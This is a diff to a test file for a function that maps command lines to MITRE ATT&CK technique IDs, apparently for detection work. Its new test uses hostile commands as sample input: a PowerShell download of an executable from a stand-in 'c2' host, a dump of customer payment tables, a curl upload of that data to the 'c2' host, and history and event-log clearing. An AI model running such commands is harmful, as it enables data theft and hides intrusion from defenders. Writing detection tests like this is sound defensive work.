@@ -24,9 +24,20 @@ describe("reconTechniques — discovery / credential-access tagging", () => {
     expect(reconTechniques("/usr/bin/cat", "cat /opt/veridia-app/.env")).toContain("T1552.001");
   });
 
+  it("tags the action techniques that survive in EDR telemetry after history-clearing (evt-006/011/012/013/014/009)", () => {
+    expect(reconTechniques("powershell.exe", "(New-Object System.Net.WebClient).DownloadFile('https://c2/wdi-svc.exe','C:\\Windows\\Temp\\wdi-svc.exe')")).toContain("T1105");
+    expect(reconTechniques("/usr/bin/mysqldump", "mysqldump -u veridia_app -p prod customers payment_methods")).toContain("T1005");
+    expect(reconTechniques("/usr/bin/gzip", "gzip -9 /tmp/export-4291.sql")).toContain("T1560.001");
+    expect(reconTechniques("/usr/bin/curl", "curl -X POST https://c2/api/sync -F data=@/tmp/x.gz")).toContain("T1041");
+    expect(reconTechniques("/usr/bin/truncate", "truncate -s 0 ~/.bash_history")).toContain("T1070.003");
+    expect(reconTechniques("wevtutil.exe", "wevtutil cl Security")).toContain("T1070.001");
+    expect(reconTechniques("/usr/bin/ssh", "ssh deploy@10.10.20.20")).toContain("T1021.004");
+  });
+
   it("does not tag benign non-recon commands", () => {
     expect(reconTechniques("/usr/bin/ls", "ls -la")).toEqual([]);
     expect(reconTechniques("powershell.exe", "Get-Date")).toEqual([]);
+    expect(reconTechniques("/usr/bin/curl", "curl https://example.com")).toEqual([]); // plain download w/o -o is not T1105
   });
 
   it("techniqueName resolves recon ids, falls back to the bare id", () => {
